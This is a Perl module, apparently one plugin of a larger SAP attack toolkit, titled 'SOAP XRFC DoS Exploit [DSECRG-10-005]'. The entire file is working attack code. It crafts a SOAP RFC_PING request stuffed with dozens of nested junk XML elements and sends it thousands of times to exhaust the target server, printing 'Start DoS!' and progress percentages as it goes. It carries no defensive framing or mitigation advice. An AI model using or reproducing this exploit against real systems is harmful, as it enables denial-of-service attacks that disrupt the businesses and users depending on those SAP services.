#!/usr/bin/perl
# Module SOAP XRFC DoS Exploit 	[DSECRG-10-005] 

# CONFIG
######################
my $desc ="SOAP XRFC DoS Exploit [DSECRG-10-005] \n\t Usage: black.pl .. .. -m id_module <num> - packet count, default is 2000\n"; 
our $funcName="soapXrfcDOS";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub soapXrfcDOS()
{

	my $XML="<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">\r\n<SOAP-ENV:Body>\r\n\r\n<m:RFC_PING xmlns:m=\"urn:sap-com:document:sap:rfc:functions\">\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n<aaaa>\r\n\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n</aaaa>\r\n\r\n</m:RFC_PING>\r\n</SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>";

	if ($ARGV[$m_arg_i+1]){
		$num=$ARGV[$m_arg_i+1];
		print $num." - num \n\n";
	} else {
		$num=2000;
	}
	
	print "Start DoS!\n";
	for (my $i=0;$i<$num;$i++)
	{
		send_soap($XML,0);
		$prc = int($i*100/$num);
		
		if(($prc%10)==0)
			{ print "$prc% - Done! ($i-$num)\n"; };
	}
	
	print "\n";
	
	
	

}